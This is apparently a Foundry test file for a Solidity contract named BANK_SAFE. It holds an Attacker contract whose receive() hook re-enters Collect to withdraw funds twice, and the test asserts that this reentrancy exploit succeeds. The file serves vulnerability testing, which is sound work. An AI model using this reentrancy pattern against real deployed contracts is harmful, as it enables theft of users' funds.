
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new BANK_SAFE();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        // Note: We do not call Initialized() here to allow SetMinSum in the test function.
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is large enough and even for clean division logic
        vm.assume(attackVal >= 2 && attackVal < 100 ether);
        vm.assume(attackVal % 2 == 0);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set MinSum to attackVal. This is crucial for the exploit logic.
        // We want to prove that we can withdraw even when the remaining balance 
        // (after first withdrawal) would be less than MinSum.
        _contractUnderTest.SetMinSum(attackVal);
        _contractUnderTest.Initialized();

        // --- 3. Funding ---
        // Fund the Victim so it has ETH to pay out
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal);
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // We attempt to withdraw half the deposit twice.
        // If secure, the second call would fail because (Balance - Half) < MinSum.
        // If vulnerable, the second call succeeds because Balance is still equal to MinSum.
        _attacker.attack(attackVal / 2);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = BANK_SAFE(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit the full amount (which equals MinSum in this test scenario)
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        amountToWithdraw = val;
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function
        victim.Collect(val);

        // Verify Success Conditions
        // We expect to have received 'val' twice.
        if (address(this).balance >= initialBalance + (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            // If vulnerable: Balance is still 'attackVal' (>= MinSum). Success.
            // If secure: Balance is 'attackVal - val' (< MinSum). Fail.
            victim.Collect(amountToWithdraw);
        }
    }
}
